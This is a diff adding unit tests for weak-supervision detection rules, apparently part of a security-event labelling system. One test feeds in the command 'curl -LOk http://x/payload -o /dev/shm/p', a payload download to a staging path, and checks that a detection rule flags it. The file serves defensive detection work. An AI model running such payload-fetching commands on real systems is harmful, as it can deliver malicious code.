@@ -86,5 +86,31 @@ class TestWeakSupervisionRules(unittest.TestCase):
         self.assertTrue(out[0].edge_attrs.get("_rule_ioc_type"))
 
 
+    def test_load_alternate_rules_relpath(self) -> None:
+        alt = load_weak_supervision_rules(
+            str(self.repo),
+            "config/weak_supervision_rules_update_ablation.json",
+        )
+        self.assertEqual(int(alt.get("version")), 3)
+        ids = [p["id"] for p in alt.get("tier2_cmdline_patterns") or []]
+        self.assertIn("tier2_staging_path_download", ids)
+
+    def test_staging_path_download_rule_ablation(self) -> None:
+        alt = load_weak_supervision_rules(
+            str(self.repo),
+            "config/weak_supervision_rules_update_ablation.json",
+        )
+        ev = Event(
+            edge_type=EdgeType.EXEC,
+            src=EntityRef(NodeType.PROC, "a"),
+            dst=EntityRef(NodeType.PROC, "b"),
+            edge_attrs={"cmdline": "curl -LOk http://x/payload -o /dev/shm/p"},
+            raw={"source_file": "azure_events.csv"},
+        )
+        hits, conf = infer_rule_hits_for_event(ev, alt, ioc_log_source=True)
+        self.assertIn("tier2_staging_path_download", hits)
+        self.assertEqual(conf, "high")
+
+
 if __name__ == "__main__":
     unittest.main()
